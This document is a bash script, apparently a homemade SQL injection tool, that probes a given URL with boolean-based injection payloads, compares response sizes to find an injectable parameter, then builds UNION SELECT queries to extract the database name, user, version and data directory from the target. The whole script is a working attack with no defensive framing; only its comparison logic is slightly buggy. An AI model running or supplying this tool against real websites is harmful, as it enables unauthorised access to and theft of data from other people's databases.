#!/bin/bash

urlSize="$(curl -s $1 | wc --bytes)"
size=0
finalType=0
finalUrl=null
finalColsUrl=null
finalNums=0

declare -a ext=("database()" "user()" "@@version" "@@datadir")
declare -a info=()
declare -a types=("%20and%201=1" "%20and%201=0" "%27%20and%20%271%27=%271"
"%27%20and%20%271%27=%270" "%22%20and%20%221%22=%221" "%22%20and%20%221%22=%220")

echo "--------------------------------------------------------------------------------------------------"
echo "URL: $1"
echo "--------------------------------------------------------------------------------------------------"

for (( i=0; i<6; i++ ))
do
    url="$1""${types[i]}"
    x="$(curl -s $url | wc --bytes)"
    
    if [ $x -eq $urlSize ];
    then
        z=i+1
        finalUrl="$1""${types[z]}"
        echo "Vulnerable with ${types[i]}"
        echo "Final URL -> $finalUrl"
    fi
done

finalUrl="$finalUrl""%20union%20select%20"
touch new_file.txt
echo "--------------------------------------------------------------------------------------------------"
echo "Number of columns to use with 'SELECT' query: "
read cols

for (( j=1; j<=$cols; j++ ))
do
    
    if [ $j -eq 1 ]
    then
        nums="$j$j$j$j$j$j"
    else
        nums=",""$j$j$j$j$j$j"
    fi
    
    finalUrl="$finalUrl""$nums"
    x="$(curl -s $finalUrl | wc --bytes)"
    
    if [ $x -gt $size ]
    then
        finalColsUrl=null
        size=$x
        curl -s $finalUrl > finalUrl.txt
        finalColsUrl=$finalUrl
        echo "Found $finalColsUrl"
        finalNums="$j$j$j$j$j$j"
    fi
done

# info
echo
echo "-------------------------------------------| INFO |-------------------------------------------"
echo
echo "Trying to get this info... database(), user(), @@version, @@datadir"
for (( k=0; k<4; k++ ))
do
    temp=$(echo "$finalColsUrl" | sed "s/$finalNums/${ext[k]}/") 	#quita los campos de la url y pone (database(), user()...)
    curl -s $temp > temp.txt
    bytes=$(cmp -b finalUrl.txt temp.txt | grep -o '[[:digit:]]*')
    bytes=$(echo "$bytes" | sed -n 1p)
    bytes=$(( bytes-1 ))
    dd if=temp.txt of=new_file.txt bs=1 skip=$bytes status=none
    info[k]=$(cat new_file.txt | head -n 1 | cut -d '<' -f1)
    echo
    echo "${ext[k]} name -> ${info[k]}"
    echo
done
echo "--------------------------------------------------------------------------------------------------"
echo

rm new_file.txt
rm finalUrl.txt
rm temp.txt